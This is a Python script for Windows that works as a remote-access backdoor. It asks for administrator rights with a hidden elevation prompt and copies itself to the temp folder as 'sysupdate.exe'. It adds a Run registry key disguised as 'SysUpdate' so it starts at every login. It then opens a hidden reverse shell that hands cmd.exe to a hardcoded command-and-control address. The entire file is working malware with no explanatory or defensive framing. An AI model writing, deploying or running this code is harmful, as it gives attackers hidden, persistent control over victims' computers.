import os
import sys
import ctypes
import subprocess
import socket
import tempfile
import shutil

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def elevate():
    params = f'"{__file__}"'
    ctypes.windll.shell32.ShellExecuteW(
        None,
        "runas",
        sys.executable,
        params,
        None,
        0
    )
    sys.exit(0)

def install_persistence():
    temp = tempfile.gettempdir()
    dst = os.path.join(temp, "sysupdate.exe")
    if not os.path.exists(dst):
        shutil.copy(sys.executable, dst)
        subprocess.run([
            "reg", "add",
            r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run",
            "/v", "SysUpdate",
            "/d", dst,
            "/f"
        ], shell=True)

def reverse_shell(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    si = subprocess.STARTUPINFO()
    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    si.wShowWindow = subprocess.SW_HIDE
    creation_flags = subprocess.CREATE_NO_WINDOW

    proc = subprocess.Popen(
        ["cmd.exe"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        startupinfo=si,
        creationflags=creation_flags,
        shell=False
    )

    while True:
        data = s.recv(1024)
        if not data:
            break
        proc.stdin.write(data)
        proc.stdin.flush()
        output = proc.stdout.read1(1024) or proc.stderr.read1(1024)
        if output:
            s.send(output)

    proc.kill()
    s.close()

if __name__ == "__main__":
    C2_HOST = "192.168.10.5"
    C2_PORT = 5555

    if not is_admin():
        elevate()

    install_persistence()
    reverse_shell(C2_HOST, C2_PORT)
